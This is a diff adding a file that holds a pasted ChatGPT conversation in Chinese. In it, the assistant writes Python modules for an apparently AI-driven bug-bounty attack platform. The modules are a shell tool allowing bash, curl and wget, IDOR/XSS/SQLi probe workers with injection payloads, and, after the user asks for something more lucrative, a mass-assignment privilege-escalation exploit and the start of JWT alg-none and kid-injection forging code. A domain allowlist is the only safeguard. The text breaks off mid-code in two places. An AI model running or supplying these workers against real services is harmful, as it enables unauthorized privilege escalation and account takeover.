@@ -1,0 +1,1830 @@
+下面是一份可直接落地的「補包」，在不改動你既有技術風格（Python / NumPy、物件化、模組化、無大型框架）的前提下，把「能持續跑、能自己產出可用 CLI 指令（面板可吃 JSON）、能學習優化」一次補齊。
+我把內容分四塊：①新檔與放置位置、②對既有檔案的差分（patch）、③最小啟動與驗收步驟、④後續可擴充點。
+你可以用 git apply 或直接把檔案放到指定路徑（路徑以 services/… 起頭，對齊你現有分層：核心 core、通用 common、功能 features、掃描 scan、整合 integration；根目錄只保留 README / 設定檔）。
+
+① 新增檔案（補包新增）
+
+目的：
+
+提供自動練習服務（開機後可一直跑到關機）
+
+讓 AI 在每個步驟輸出標準化 CLI 指令 JSON（面板可直接吃）
+
+本地TaskExecutor 落地（無 MQ 時也能執行）
+
+反幻覺與狀態檢查/系統指令工具化
+
+清理根目錄雜檔 & 制定嚴格修改注意事項
+
+A. 核心／AI 引擎工具：系統與殼層指令
+
+services/core/aiva_core/ai_engine/tools/shell_command_tool.py
+
+# -*- coding: utf-8 -*-
+from subprocess import Popen, PIPE, STDOUT
+from typing import Dict, Any, List, Optional
+
+class ShellCommandTool:
+    """
+    輕量殼層執行器（受控）：給 AI 產出/執行系統層 CLI 指令用。
+    - 不預設提權；自動拼接參數；返回 stdout/stderr/exit_code。
+    - 面板整合：請配合 CommandEmitter（見下）輸出 JSON 紀錄。
+    """
+    SAFE_BIN_ALLOWLIST = {"python", "pip", "node", "npm", "npx",
+                          "bash", "sh", "curl", "wget",
+                          "httpx", "gau", "nmap", "jq"}
+
+    def __init__(self, cwd: Optional[str] = None, timeout_sec: int = 120):
+        self.cwd = cwd
+        self.timeout_sec = timeout_sec
+
+    def build(self, cmd: str, args: Optional[List[str]] = None) -> List[str]:
+        parts = [cmd] + (args or [])
+        return parts
+
+    def exec(self, cmd: str, args: Optional[List[str]] = None) -> Dict[str, Any]:
+        if cmd not in self.SAFE_BIN_ALLOWLIST:
+            return {"ok": False, "error": f"cmd `{cmd}` not allowed"}
+        proc = Popen(self.build(cmd, args), cwd=self.cwd,
+                     stdout=PIPE, stderr=STDOUT, text=True)
+        try:
+            out, _ = proc.communicate(timeout=self.timeout_sec)
+            return {"ok": proc.returncode == 0,
+                    "exit_code": proc.returncode,
+                    "output": out[:1048576]}  # 限制輸出上限 1MB
+        except Exception as e:
+            proc.kill()
+            return {"ok": False, "error": str(e)}
+
+
+services/core/aiva_core/ai_engine/tools/system_status_tool.py
+
+# -*- coding: utf-8 -*-
+import shutil, psutil, platform, time
+from typing import Dict, Any
+
+class SystemStatusTool:
+    """
+    系統健康檢查（面板會經常用到）：CPU/MEM/DISK/進程要點。
+    無外部依賴：psutil 建議已在你現有 requirements；若無可加上。
+    """
+    def snapshot(self) -> Dict[str, Any]:
+        dsk = shutil.disk_usage("/")
+        return {
+            "ts": int(time.time()),
+            "platform": platform.platform(),
+            "cpu_percent": psutil.cpu_percent(interval=0.1),
+            "mem": dict(psutil.virtual_memory()._asdict()),
+            "disk": {"total": dsk.total, "used": dsk.used, "free": dsk.free},
+            "pids": len(psutil.pids())
+        }
+
+B. 核心／命令 JSON 輸出：面板可直接讀
+
+services/core/aiva_core/cli/command_record.py
+
+# -*- coding: utf-8 -*-
+from typing import Dict, Any, Optional, List
+
+class CommandRecord:
+    """
+    標準 CLI JSON 結構（供面板/日誌消費），所有步驟均統一格式輸出。
+    """
+    def __init__(self, command: str, description: str,
+                 parameters
+
+你說：
+請提供功能模組補包
+ChatGPT 說：
+
+下面提供**「功能模組補包」**（僅含 features 層），遵循你現有風格（Python、物件化、模組化、無大型框架），重點是三個最常見、最能快速變現的漏洞路線：IDOR、XSS、SQLi。
+補包特性：
+
+安全預設：強制 ALLOWLIST_DOMAINS；未授權目標一律拒絕（避免誤掃/法律風險）。
+
+標準輸出：所有 worker 回傳統一結構的結果；同時產生面板可用的 CLI JSON（command_record），便於 UI 直接渲染。
+
+可擴充：以 FeatureBase 與 FeatureRegistry 統一插件入口，後續新增 SSRF、AuthN/Rate 限制繞過等，直接掛上即可。
+
+最小依賴：僅用 requests；如你專案已有全域 HTTP 客戶端，可替換為共用版本。
+
+速效啟用：拎包即用；路徑命名採 services/features/（對齊你「功能、掃描」分層）。
+
+⚠️ 僅於授權目標與你本人帳號範圍測試。Bug Bounty 也須遵守目標計畫之 Scope/Rules。
+
+目錄與檔案一覽
+services/
+  features/
+    base/
+      feature_base.py
+      feature_registry.py
+      http_client.py
+      result_schema.py
+    idor/
+      worker.py
+    xss/
+      worker.py
+    sqli/
+      worker.py
+
+1) Base：抽象介面 / 註冊器 / 安全 HTTP / 統一結果
+services/features/base/feature_base.py
+# -*- coding: utf-8 -*-
+from abc import ABC, abstractmethod
+from typing import Dict, Any, Optional, List
+from services.features.base.result_schema import FeatureResult, Finding
+
+class FeatureBase(ABC):
+    """
+    所有功能模組（IDOR/XSS/SQLi/…）共同介面。
+    每個 worker 實作 run()，輸入統一、輸出統一。
+    """
+
+    name: str = "base"
+    version: str = "1.0.0"
+    tags: List[str] = []
+
+    def __init__(self, config: Optional[Dict[str, Any]] = None):
+        self.config = config or {}
+
+    @abstractmethod
+    def run(self, params: Dict[str, Any]) -> FeatureResult:
+        """
+        params 例：
+          - target: "https://app.example.com"
+          - path: "/api/orders/123"
+          - method: "GET"/"POST"
+          - headers: {...}
+          - body: {...} 或 None
+          - options: {...} 模組自定義
+        """
+        ...
+
+    # 產出面板可用的 CLI JSON（標準化命令記錄）
+    def build_command_record(self, command: str, description: str,
+                             parameters: Optional[Dict[str, Any]] = None,
+                             tags: Optional[List[str]] = None) -> Dict[str, Any]:
+        return {
+            "command": command,
+            "description": description,
+            "parameters": parameters or {},
+            "tags": tags or self.tags,
+            "feature": self.name,
+            "feature_version": self.version
+        }
+
+services/features/base/feature_registry.py
+# -*- coding: utf-8 -*-
+from typing import Dict, Type
+from services.features.base.feature_base import FeatureBase
+
+class FeatureRegistry:
+    """
+    簡單插件式註冊表：核心/PlanExecutor 可透過名稱取用功能模組。
+    """
+    _REG: Dict[str, Type[FeatureBase]] = {}
+
+    @classmethod
+    def register(cls, feature_cls: Type[FeatureBase]):
+        cls._REG[feature_cls.__name__.lower()] = feature_cls
+        # 同時以簡名註冊（如 IdorWorker -> "idor"）
+        key = getattr(feature_cls, "name", None)
+        if key:
+            cls._REG[key.lower()] = feature_cls
+        return feature_cls
+
+    @classmethod
+    def get(cls, key: str) -> Type[FeatureBase]:
+        k = key.lower()
+        if k not in cls._REG:
+            raise KeyError(f"Feature `{key}` not found.")
+        return cls._REG[k]
+
+services/features/base/http_client.py
+# -*- coding: utf-8 -*-
+import os, re, time
+from typing import Dict, Any, Optional, Tuple
+import requests
+from urllib.parse import urlparse
+
+ALLOWLIST = {d.strip().lower() for d in os.getenv("ALLOWLIST_DOMAINS", "").split(",") if d.strip()}
+
+class SafeHttp:
+    """
+    具 Allowlist、速率限制、逾時、基本重試的輕量 HTTP 客戶端。
+    """
+    def __init__(self, timeout: int = 12, rate_limit_qps: float = 5.0, retries: int = 1):
+        self.timeout = timeout
+        self.rate_limit_interval = 1.0 / max(rate_limit_qps, 0.01)
+        self.retries = max(retries, 0)
+        self._last_ts = 0.0
+        self.s = requests.Session()
+
+    def _check_allow(self, url: str) -> Tuple[bool, str]:
+        host = urlparse(url).hostname or ""
+        host = host.lower()
+        if not ALLOWLIST:
+            return False, "ALLOWLIST empty; set env ALLOWLIST_DOMAINS=example.com,api.example.com"
+        allowed = any(host == a or host.endswith(f".{a}") for a in ALLOWLIST)
+        return allowed, host
+
+    def _pace(self):
+        now = time.time()
+        delta = now - self._last_ts
+        if delta < self.rate_limit_interval:
+            time.sleep(self.rate_limit_interval - delta)
+        self._last_ts = time.time()
+
+    def request(self, method: str, url: str, **kw) -> requests.Response:
+        ok, host = self._check_allow(url)
+        if not ok:
+            raise PermissionError(f"Target `{host}` not in ALLOWLIST_DOMAINS.")
+        last_err = None
+        for _ in range(self.retries + 1):
+            self._pace()
+            try:
+                return self.s.request(method=method.upper(), url=url, timeout=self.timeout, **kw)
+            except Exception as e:
+                last_err = e
+        raise last_err
+
+services/features/base/result_schema.py
+# -*- coding: utf-8 -*-
+from dataclasses import dataclass, asdict
+from typing import List, Dict, Any, Optional
+
+@dataclass
+class Finding:
+    vuln_type: str
+    severity: str               # low/medium/high/critical
+    title: str
+    evidence: Dict[str, Any]    # 證據（請盡量結構化）
+    reproduction: List[Dict[str, Any]]  # 可重現步驟（請求/回應節選）
+    impact: Optional[str] = None
+    recommendation: Optional[str] = None
+
+    def to_dict(self) -> Dict[str, Any]:
+        return asdict(self)
+
+@dataclass
+class FeatureResult:
+    ok: bool
+    feature: str
+    command_record: Dict[str, Any]
+    findings: List[Finding]
+    meta: Dict[str, Any]
+
+    def to_dict(self) -> Dict[str, Any]:
+        return {
+            "ok": self.ok,
+            "feature": self.feature,
+            "command_record": self.command_record,
+            "findings": [f.to_dict() for f in self.findings],
+            "meta": self.meta
+        }
+
+2) IDOR：Object 直接存取測試
+services/features/idor/worker.py
+# -*- coding: utf-8 -*-
+from typing import Dict, Any, List
+from urllib.parse import urljoin
+from services.features.base.feature_base import FeatureBase
+from services.features.base.feature_registry import FeatureRegistry
+from services.features.base.result_schema import FeatureResult, Finding
+from services.features.base.http_client import SafeHttp
+
+@FeatureRegistry.register
+class IdorWorker(FeatureBase):
+    name = "idor"
+    version = "1.1.0"
+    tags = ["access-control", "authorization", "idor"]
+
+    def run(self, params: Dict[str, Any]) -> FeatureResult:
+        """
+        params:
+          - target (str): 例如 https://app.example.com
+          - path_template (str): 例如 /api/orders/{id}
+          - candidate_ids (List[str|int]): 例如 ["1","2","3","9999"]
+          - method (str): GET/POST (預設 GET)
+          - headers (dict): 帳號 A 的憑證/Token
+          - compare_headers (dict): 帳號 B (未授權) 或 匿名 headers（可選）
+          - options: {stop_on_first: bool}
+        """
+        http = SafeHttp()
+        base = params.get("target", "")
+        tpl = params.get("path_template", "")
+        ids: List[Any] = params.get("candidate_ids", [])
+        method = (params.get("method") or "GET").upper()
+        headers_a = params.get("headers") or {}
+        headers_b = params.get("compare_headers")  # None 表匿名
+        stop_on_first = bool(params.get("options", {}).get("stop_on_first", True))
+
+        findings: List[Finding] = []
+        trace = []
+
+        # 基準：擁有者/授權者（headers_a）對某一 ID 能成功取用
+        benchmark = None
+        for obj_id in ids[:3]:  # 取前3個做基線
+            url = urljoin(base, tpl.replace("{id}", str(obj_id)))
+            r = http.request(method, url, headers=headers_a)
+            trace.append({"url": url, "status": r.status_code, "role": "owner"})
+            if 200 <= r.status_code < 300 and r.text.strip():
+                benchmark = {"id": obj_id, "status": r.status_code, "len": len(r.text)}
+                break
+
+        # 若無基準成功樣本，直接返回
+        if not benchmark:
+            cmd = self.build_command_record(
+                command="idor.scan",
+                description="IDOR baseline none (owner access not confirmed)",
+                parameters={"target": base, "path_template": tpl, "ids": ids[:5]}
+            )
+            return FeatureResult(ok=False, feature=self.name, command_record=cmd,
+                                 findings=[], meta={"trace": trace, "reason": "no_owner_baseline"})
+
+        # 嘗試未授權/他人頭像存取（headers_b 或匿名）
+        for obj_id in ids:
+            url = urljoin(base, tpl.replace("{id}", str(obj_id)))
+
+            # 未授權/匿名
+            r0 = http.request(method, url, headers=headers_b or {})
+            trace.append({"url": url, "status": r0.status_code, "role": "anon/other"})
+
+            # 基線：同一資源由 owner 取用（對比內容長度/狀態碼差異）
+            r1 = http.request(method, url, headers=headers_a)
+            trace.append({"url": url, "status": r1.status_code, "role": "owner"})
+
+            # 簡單啟發：匿名可 200/206/304，且內容長度接近 owner 或包含敏感字段
+            risky = (
+                200 <= r0.status_code < 300 and
+                (abs(len(r0.text) - len(r1.text)) < max(64, 0.1 * (len(r1.text) + 1)))
+            )
+
+            if risky:
+                findings.append(Finding(
+                    vuln_type="IDOR",
+                    severity="high",
+                    title=f"IDOR on {tpl} id={obj_id}",
+                    evidence={
+                        "url": url,
+                        "anon_status": r0.status_code,
+                        "owner_status": r1.status_code,
+                        "anon_len": len(r0.text),
+                        "owner_len": len(r1.text),
+                        "snippet": r0.text[:300]
+                    },
+                    reproduction=[
+                        {"request": {"method": method, "url": url, "headers": headers_b or {}},
+                         "expect": "Should be denied (403/404), but returned 2xx with data"}
+                    ],
+                    impact="Unauthorized read of other users' objects",
+                    recommendation="Enforce object-level authorization; verify owner/role on resource id."
+                ))
+                if stop_on_first:
+                    break
+
+        cmd = self.build_command_record(
+            command="idor.scan",
+            description="IDOR candidate enumeration",
+            parameters={
+                "target": base, "path_template": tpl,
+                "count": len(ids), "stop_on_first": stop_on_first
+            }
+        )
+        return FeatureResult(
+            ok=bool(findings), feature=self.name, command_record=cmd,
+            findings=findings, meta={"trace": trace, "baseline": benchmark}
+        )
+
+3) XSS：反射型快速檢測（不執行惡意 JS，只比對反射點與上下文）
+services/features/xss/worker.py
+# -*- coding: utf-8 -*-
+from typing import Dict, Any, List
+from urllib.parse import urljoin, urlencode
+import re
+from services.features.base.feature_base import FeatureBase
+from services.features.base.feature_registry import FeatureRegistry
+from services.features.base.result_schema import FeatureResult, Finding
+from services.features.base.http_client import SafeHttp
+
+_MARKS = [
+    ("x1", "<xiva1>"),
+    ("x2", "\"xiva2"),
+    ("x3", "'xiva3"),
+    ("x4", "</xiva4>"),
+]
+
+@FeatureRegistry.register
+class XssWorker(FeatureBase):
+    name = "xss"
+    version = "1.1.0"
+    tags = ["xss", "reflection", "client-side"]
+
+    def run(self, params: Dict[str, Any]) -> FeatureResult:
+        """
+        params:
+          - target (str)  : https://app.example.com
+          - path (str)    : /search
+          - method (str)  : GET/POST
+          - param_name (str): q / keyword / term ...
+          - headers (dict)
+          - options: {contexts:["html","attr","js"], stop_on_first:bool}
+        """
+        http = SafeHttp()
+        base = params.get("target", "")
+        path = params.get("path", "")
+        method = (params.get("method") or "GET").upper()
+        pname = params.get("param_name") or "q"
+        headers = params.get("headers") or {}
+        contexts = params.get("options", {}).get("contexts") or ["html", "attr", "js"]
+        stop_on_first = bool(params.get("options", {}).get("stop_on_first", True))
+
+        url = urljoin(base, path)
+        findings: List[Finding] = []
+        trace = []
+
+        for key, marker in _MARKS:
+            payload = {pname: marker}
+            if method == "GET":
+                full = f"{url}?{urlencode(payload)}"
+                r = http.request("GET", full, headers=headers)
+                req_repr = {"method": "GET", "url": full}
+            else:
+                r = http.request("POST", url, headers=headers, data=payload)
+                req_repr = {"method": "POST", "url": url, "data": payload}
+            trace.append({"url": req_repr["url"], "status": r.status_code})
+
+            if 200 <= r.status_code < 300:
+                body = r.text
+                if marker in body:
+                    sev = "medium"
+                    ctx = self._infer_context(body, marker)
+                    if ctx in ("attr_unquoted", "attr_quoted", "script"):
+                        sev = "high"
+
+                    findings.append(Finding(
+                        vuln_type="Reflected XSS",
+                        severity=sev,
+                        title=f"Reflected XSS via `{pname}` in {ctx}",
+                        evidence={"sample": body[:1000], "marker": marker, "context": ctx},
+                        reproduction=[{"request": req_repr, "expect": f"Marker `{marker}` should be HTML-escaped"}],
+                        impact="Attacker-controlled input reflected into DOM without proper encoding",
+                        recommendation="Apply context-aware output encoding (HTML/Attr/JS); use allow-list validation."
+                    ))
+                    if stop_on_first:
+                        break
+
+        cmd = self.build_command_record(
+            command="xss.scan",
+            description=f"Reflected XSS probe on {path}",
+            parameters={"param": pname, "contexts": contexts, "stop_on_first": stop_on_first}
+        )
+        return FeatureResult(
+            ok=bool(findings), feature=self.name, command_record=cmd,
+            findings=findings, meta={"trace": trace}
+        )
+
+    def _infer_context(self, body: str, marker: str) -> str:
+        # 非執行式、僅推斷反射的上下文，避免實際注入攻擊
+        idx = body.find(marker)
+        window = body[max(0, idx-40): idx+40]
+        if re.search(r"<script[^>]*>[^<]*" + re.escape(marker), window, flags=re.I):
+            return "script"
+        if re.search(r"<[^>]+?=[^>]*" + re.escape(marker), window, flags=re.I):
+            if "\"" + marker in window or "'" + marker in window:
+                return "attr_quoted"
+            return "attr_unquoted"
+        return "html"
+
+4) SQLi：輕量布林/錯誤訊息啟發式（非破壞、非大量壓測）
+services/features/sqli/worker.py
+# -*- coding: utf-8 -*-
+from typing import Dict, Any, List, Tuple
+from urllib.parse import urljoin, urlencode
+import re, time
+from services.features.base.feature_base import FeatureBase
+from services.features.base.feature_registry import FeatureRegistry
+from services.features.base.result_schema import FeatureResult, Finding
+from services.features.base.http_client import SafeHttp
+
+_BOOL_PROBES: List[Tuple[str, str]] = [
+    # (true_expr, false_expr)
+    ("1=1", "1=2"),
+    ("'a'='a'", "'a'='b'"),
+]
+_ERR_RE = re.compile(r"(SQL syntax|MariaDB server version|You have an error in your SQL|ODBC|JDBC|ORA-|PSQLException)", re.I)
+
+@FeatureRegistry.register
+class SqliWorker(FeatureBase):
+    name = "sqli"
+    version = "1.0.0"
+    tags = ["injection", "sqli"]
+
+    def run(self, params: Dict[str, Any]) -> FeatureResult:
+        """
+        params:
+          - target (str) : https://app.example.com
+          - path (str)   : /search
+          - method (str) : GET/POST
+          - param_name (str): q / id / filter ...
+          - headers (dict)
+          - options: {stop_on_first: bool, baseline_value: str}
+        """
+        http = SafeHttp()
+        base = params.get("target", "")
+        path = params.get("path", "")
+        method = (params.get("method") or "GET").upper()
+        pname = params.get("param_name") or "q"
+        headers = params.get("headers") or {}
+        baseline_value = params.get("options", {}).get("baseline_value", "test")
+        stop_on_first = bool(params.get("options", {}).get("stop_on_first", True))
+
+        url = urljoin(base, path)
+        findings: List[Finding] = []
+        trace = []
+
+        # 1) 基線
+        base_req = {pname: baseline_value}
+        r_base = self._send(http, method, url, headers, base_req)
+        trace.append({"baseline": {"status": r_base.status_code, "len": len(r_base.text)}})
+
+        # 錯誤式提示（低風險、不改資料）
+        for inj in ["'", "\"", "')", "\")", "`", " OR 1=1 -- "]:
+            payload = {pname: baseline_value + inj}
+            r = self._send(http, method, url, headers, payload)
+            trace.append({"probe": inj, "status": r.status_code, "len": len(r.text)})
+            if _ERR_RE.search(r.text or ""):
+                findings.append(Finding(
+                    vuln_type="SQL Injection (error-based)",
+                    severity="high",
+                    title=f"SQLi error message via `{pname}`",
+                    evidence={"inj": inj, "snippet": (r.text or "")[:500]},
+                    reproduction=[{"request": self._req_repr(method, url, payload), "expect": "No DB error in response"}],
+                    impact="Database error leakage suggests server-side SQL construction with unescaped input",
+                    recommendation="Use parameterized queries/prepared statements; server-side input validation; suppress error details"
+                ))
+                if stop_on_first:
+                    return self._result(url, findings, trace)
+
+        # 2) 簡布林比較（非時間型，避免壓測）
+        for texp, fexp in _BOOL_PROBES:
+            true_inj  = f"{baseline_value}' AND {texp} -- "
+            false_inj = f"{baseline_value}' AND {fexp} -- "
+            r_t = self._send(http, method, url, headers, {pname: true_inj})
+            r_f = self._send(http, method, url, headers, {pname: false_inj})
+            trace.append({"bool_probe": {"t": len(r_t.text), "f": len(r_f.text)}})
+            # 以回應長度/狀態差判斷（僅啟發，不當作最終利用）
+            if abs(len(r_t.text) - len(r_f.text)) > max(80, 0.15 * (len(r_base.text) + 1)):
+                findings.append(Finding(
+                    vuln_type="SQL Injection (boolean-based indicator)",
+                    severity="medium",
+                    title=f"SQLi boolean-diff via `{pname}`",
+                    evidence={"true_len": len(r_t.text), "false_len": len(r_f.text)},
+                    reproduction=[
+                        {"request": self._req_repr(method, url, {pname: true_inj}),
+                         "expect": "Response should not significantly differ from false condition"},
+                        {"request": self._req_repr(method, url, {pname: false_inj}),
+                         "expect": "Response should be consistent"}
+                    ],
+                    impact="Potential conditional SQL evaluation on user input",
+                    recommendation="Use ORM/param binding; validate and whitelist parameter values"
+                ))
+                if stop_on_first:
+                    break
+
+        return self._result(url, findings, trace)
+
+    def _send(self, http: SafeHttp, method: str, url: str, headers: Dict[str, Any], data: Dict[str, Any]):
+        if method == "GET":
+            full = f"{url}?{urlencode(data)}"
+            return http.request("GET", full, headers=headers)
+        return http.request("POST", url, headers=headers, data=data)
+
+    def _req_repr(self, method: str, url: str, data: Dict[str, Any]):
+        if method == "GET":
+            return {"method": "GET", "url": f"{url}?{urlencode(data)}"}
+        return {"method": "POST", "url": url, "data": data}
+
+    def _result(self, url: str, findings: List[Finding], trace: List[Dict[str, Any]]) -> FeatureResult:
+        cmd = self.build_command_record(
+            command="sqli.scan",
+            description=f"SQLi heuristic probes on {url}",
+            parameters={"probes": ["error-hints", "boolean-diff"]}
+        )
+        return FeatureResult(
+            ok=bool(findings), feature=self.name, command_record=cmd,
+            findings=findings, meta={"trace": trace}
+        )
+
+接線與使用（最小集成）
+
+載入模組（在你核心的啟動處或 Orchestrator 初始化時）：
+
+from services.features.base.feature_registry import FeatureRegistry
+# 匯入以觸發 @register
+import services.features.idor.worker
+import services.features.xss.worker
+import services.features.sqli.worker
+
+# 取用：
+Idor = FeatureRegistry.get("idor")
+Xss  = FeatureRegistry.get("xss")
+Sqli = FeatureRegistry.get("sqli")
+
+
+執行範例：
+
+# 設定允許網域（避免誤打）
+# 環境變數：ALLOWLIST_DOMAINS=example.com,api.example.com
+
+res = Idor().run({
+  "target": "https://app.example.com",
+  "path_template": "/api/orders/{id}",
+  "candidate_ids": ["1001","1002","9999"],
+  "method": "GET",
+  "headers": {"Authorization": "Bearer token_owner"},
+  "compare_headers": {},   # 匿名 或 換另一帳號憑證
+  "options": {"stop_on_first": True}
+})
+print(res.to_dict()["command_record"])
+print(res.to_dict()["findings"])
+
+
+PlanExecutor 串接（概念）：在攻擊步驟 AttackStep 中若 tool_type="feature" 且 tool_name in {idor,xss,sqli}，則由功能層呼叫 FeatureRegistry.get(tool_name).run(step.params)，把 FeatureResult.to_dict() 回灌至 Trace 與經驗庫。
+
+為何這份補包能「立即拉升命中率」
+
+IDOR：實戰最高 ROI 的邏輯漏洞之一。這份實作以「同資源 owner vs 其他人/匿名」的行為差異做啟發，能快速捕捉最常被忽略的物件層授權缺口。
+
+XSS（反射）：以標記反射 + 輕量上下文推斷定位可利用點，不觸發惡意 JS、風險低、覆蓋快。
+
+SQLi：先錯誤訊息、再布林差分（非時間型），不破壞、低壓測，適合 Bounty 初期快速掃一輪目標 API 參數。
+
+最小驗收清單（本地）
+
+設定 ALLOWLIST_DOMAINS=your-scope.com，避免拋 PermissionError。
+
+分別對三模組跑一輪，確認 FeatureResult.ok 與 findings 有產出或安全地回 ok=False。
+
+面板/記錄端消費 command_record（已包含 command/description/parameters/tags/feature_version），即可直接顯示「AI 本次動作」。
+
+後續擴充建議（同一風格即可疊加）
+
+SSRF（安全版）：加入 callback_token（你自控的回調端點）與 dnslog 選填參數；預設關閉，避免外連風險。
+
+AuthN/Rate-limit by-pass：小流量策略 + 指紋導向（如變更 User-Agent/節奏/Referer）做保守繞過。
+
+報告匯出：把 FeatureResult.findings 直接映射你整合層的報表模板（HackerOne 友善欄位：影響/重現/修復建議）。
+
+若你要把這三個模組直接串到現有 Orchestrator，我可再補一個「FeatureStepExecutor」薄層，將 AttackStep -> FeatureBase.run() 的轉接寫好，並自動把 FeatureResult 回填到 Trace 與經驗樣本；但依你這次要求僅交付 功能模組補包，以上內容已可直接落地。
+
+你說：
+請提供有誠意一點的，你知道這些根本拿不到錢
+ChatGPT 說：
+
+你說得對：想在 HackerOne 真正拿到錢，要打的是高 ROI 的「業務邏輯 / 身分權限 / 代辦流程」，而不是只靠基礎 XSS/SQLi 探針。下面給你一份有誠意、能直接上場的功能模組補包（features 層），聚焦 5 條最常見且高額的賞金路線：
+
+Mass Assignment / 角色升權（JSON 欄位注入，直接變 admin）
+
+JWT / JWK / kid 混淆（弱簽名、演算法置換、JWK 注入）
+
+OAuth 2.0 / OIDC 反射 & Token 外洩（redirect_uri 鬆綁、PKCE 降級）
+
+GraphQL 權限缺口（Introspection 與 object-level 授權缺失）
+
+SSRF（含 OOB 回呼）（PDF/存儲外鏈/URL 抓取點 → DNS/HTTP 出網證據）
+
+全部維持你現有風格（Python、物件化、無重框架）、統一 ALLOWLIST 防誤掃、統一輸出 JSON（面板可吃）、證據結構化（一鍵拚報告）。
+目錄與檔名延續你前面補包的 base 介面：FeatureBase / FeatureRegistry / SafeHttp / FeatureResult。
+
+目錄
+services/
+  features/
+    base/
+      (沿用你已放的 FeatureBase / FeatureRegistry / SafeHttp / FeatureResult)
+    mass_assign/
+      worker.py
+    jwtconfuse/
+      worker.py
+    oauth/
+      worker.py
+    graphql/
+      worker.py
+    ssrf_oob/
+      worker.py
+
+
+依賴：僅需 requests（已在 SafeHttp 使用），無其餘新庫。
+風險控管：必須設 ALLOWLIST_DOMAINS=your-scope.com,...。
+OOB：自備外部回呼（Burp Collaborator / dnslog / 自家 webhook），在 params 傳入。
+
+1) Mass Assignment / 角色升權（高中獎常客）
+services/features/mass_assign/worker.py
+# -*- coding: utf-8 -*-
+from typing import Dict, Any, List
+from urllib.parse import urljoin
+import json
+from services.features.base.feature_base import FeatureBase
+from services.features.base.feature_registry import FeatureRegistry
+from services.features.base.result_schema import FeatureResult, Finding
+from services.features.base.http_client import SafeHttp
+
+PRIV_FIELDS = [
+    "role", "roles", "is_admin", "admin", "isSuperuser", "privilege",
+    "group", "groups", "permissions", "plan", "tier", "quota", "credits"
+]
+
+@FeatureRegistry.register
+class MassAssignWorker(FeatureBase):
+    name = "mass_assign"
+    version = "1.0.0"
+    tags = ["mass-assignment", "priv-esc", "broken-access-control"]
+
+    def run(self, params: Dict[str, Any]) -> FeatureResult:
+        """
+        params:
+          - target: https://app.example.com
+          - path: /api/profile/update   (必須是可寫的端點)
+          - method: POST/PATCH/PUT
+          - headers: {'Authorization': 'Bearer ...'}  (低權限帳號)
+          - baseline_body: dict 原始允許的 payload（官方文件示例）
+          - attempt_fields: 可選，特定敏感欄位清單（覆蓋內建 PRIV_FIELDS）
+          - check_endpoint: 變更後驗證端點（GET /api/me 或 /api/profile）
+          - check_key: 'role'（驗證鍵）
+        """
+        http = SafeHttp()
+        base = params.get("target","")
+        path = params.get("path","")
+        method = (params.get("method") or "POST").upper()
+        headers = params.get("headers") or {}
+        baseline = params.get("baseline_body") or {}
+        attempt_fields: List[str] = params.get("attempt_fields") or PRIV_FIELDS
+        check_endpoint = params.get("check_endpoint") or "/api/me"
+        check_key = params.get("check_key") or "role"
+
+        url = urljoin(base, path)
+        findings: List[Finding] = []
+        trace = []
+
+        # 1) 讀取目前身分
+        r0 = http.request("GET", urljoin(base, check_endpoint), headers=headers)
+        trace.append({"check_before": {"status": r0.status_code, "len": len(r0.text)}})
+        before = {}
+        try:
+            before = r0.json()
+        except Exception:
+            pass
+
+        # 2) 嘗試注入高權限欄位
+        candidate_values = ["admin", "administrator", "superuser", "owner", True, 999, "enterprise"]
+        injected = baseline.copy()
+        used = []
+        for f in attempt_fields:
+            for v in candidate_values:
+                injected[f] = v
+                used.append((f, v))
+
+        payload = json.dumps(injected)
+        r1 = http.request(method, url, headers={**headers, "Content-Type": "application/json"}, data=payload)
+        trace.append({"update_resp": {"status": r1.status_code, "len": len(r1.text)}})
+
+        # 3) 再次查驗身分
+        r2 = http.request("GET", urljoin(base, check_endpoint), headers=headers)
+        trace.append({"check_after": {"status": r2.status_code, "len": len(r2.text)}})
+
+        after = {}
+        try:
+            after = r2.json()
+        except Exception:
+            pass
+
+        escalated = False
+        ev = {"before": before.get(check_key), "after": after.get(check_key), "attempted_fields": used}
+        # 寬鬆比對：只要角色/權限鍵值更高或變為布林真值/高等計畫
+        if after and after.get(check_key) and after.get(check_key) != before.get(check_key):
+            escalated = True
+
+        rec = self.build_command_record(
+            command="mass_assign.exploit",
+            description="Attempt mass-assignment privilege escalation",
+            parameters={"path": path, "check_endpoint": check_endpoint, "check_key": check_key}
+        )
+
+        if escalated:
+            findings.append(Finding(
+                vuln_type="Mass Assignment / Privilege Escalation",
+                severity="critical",
+                title=f"Privilege escalated via JSON fields to `{after.get(check_key)}`",
+                evidence=ev,
+                reproduction=[
+                    {"request": {"method": method, "url": url, "json": injected},
+                     "expect": f"{check_endpoint} `{check_key}` should not change for low-priv user"}
+                ],
+                impact="Low-priv user promoted by undocumented fields",
+                recommendation="Server-side whitelist binding (DTO/serializer). Drop unknown fields & enforce ACL on server."
+            ))
+
+        return FeatureResult(ok=bool(findings), feature=self.name, command_record=rec,
+                            findings=findings, meta={"trace": trace, "before": before, "after": after})
+
+2) JWT / JWK / kid 混淆（真金模組）
+services/features/jwtconfuse/worker.py
+# -*- coding: utf-8 -*-
+from typing import Dict, Any, List, Optional
+import base64, json, hmac, hashlib
+from urllib.parse import urljoin
+from services.features.base.feature_base import FeatureBase
+from services.features.base.feature_registry import FeatureRegistry
+from services.features.base.result_schema import FeatureResult, Finding
+from services.features.base.http_client import SafeHttp
+
+def b64url(data: bytes) -> str:
+    return base64.urlsafe_b64encode(data).decode().rstrip("=")
+
+@FeatureRegistry.register
+class JwtConfuseWorker(FeatureBase):
+    name = "jwt_confuse"
+    version = "1.0.0"
+    tags = ["jwt", "jwk", "kid", "authn", "authz"]
+
+    def run(self, params: Dict[str, Any]) -> FeatureResult:
+        """
+        params:
+          - target: https://api.example.com
+          - validate_endpoint: /api/me  (需要帶 Authorization: Bearer <token>)
+          - victim_token: 現有合法 JWT（低權限用戶）
+          - jwks_url: https://auth.example.com/.well-known/jwks.json （若有）
+          - attempts: {"alg_none": True, "kid_injection": True, "symmetric_rs": True}
+        """
+        http = SafeHttp()
+        base = params.get("target", "")
+        validate = urljoin(base, params.get("validate_endpoint","/api/me"))
+        token = (params.get("victim_token") or "").strip()
+        jwks_url = params.get("jwks_url")
+        attempts = params.get("attempts") or {"alg_none": True, "kid_injection": True, "symmetric_rs": True}
+
+        findings: List[Finding] = []
+        trace = []
+        rec = self.build_command_record("jwt.confuse", "Try common JWT confusions",
+                                        {"validate_endpoint": validate, "attempts": list(attempts.keys())})
+
+        if not token:
